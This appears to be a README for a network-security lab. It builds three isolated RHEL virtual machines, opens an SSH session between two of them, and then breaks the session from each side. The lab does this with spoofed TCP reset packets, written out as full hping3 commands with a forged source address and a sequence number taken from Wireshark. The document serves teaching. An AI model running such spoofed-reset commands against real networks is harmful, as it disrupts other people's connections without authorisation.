# Breaking-TCP-Connection
Topic-Fabricating TCP Packets and Retransmitting it on Live Network

=>Initial Requirement-
1-Install Oracle Virtual Box
2-Create account on Redhat
3-Download rhel-baseos-9.0-x86_64-dvd
4-Create 3 virtual machines namely- RHEL9_client , RHEL9_server , RHEL9_MITM


=>Establishing TCP connection-
1-Virtual Machine Network Setup
-Ensure that all machines are set to use Internal Network with isolated internet connections.
-All vm must be on same network
-Assign a Static IP Address Using nmtui command
-RHEL9_client 
   ->IP:192.168.2.2/24
   ->Gateway:192.168.2.1
-RHEL9_server
   ->IP:192.168.2.3/24
   ->Gateway:192.168.2.1
-RHEL9_MITM
   ->IP:192.168.2.4/24
   ->Gateway:192.168.2.1
-Check IP address configuration using ip a command 

2-Run Wireshark on client.

3-Initiating SSH to establish tcp connection between client and server 
-Initiating ssh from client side 
-command used for ssh -->ssh server@192.168.2.3
Here, we have successfully establish TCP connection between client and server using ssh.

=>Breaking TCP Connection from server side-
1-Determine the sequence number of the next expected packet from client->server when the connection is quiescent using wireshark tool.

2-Fabricate TCP packet using hping3 command (spoofing as client)--> sudo hping3 192.168.2.3 -p 22 -s 60130 -R -M 6523 -L 1234 -c 1 -a 192.168.2.2

3-Observe wireshark
 -Here, we have successfully break tcp connection on server side

=>Breaking TCP Connection from client side-
1-Determine the sequence number of the next expected packet from server->client when the connection is quiescent using wireshark tool.

2-Fabricate TCP packet using hping3 command (spoofing as server)--> sudo hping3 192.168.2.2 -p 60130 -s 22 -R -M 1234 -L 6523 -c 1 -a 192.168.2.3

3-Observe wireshark
 -Here, we have successfully break tcp connection on client side.
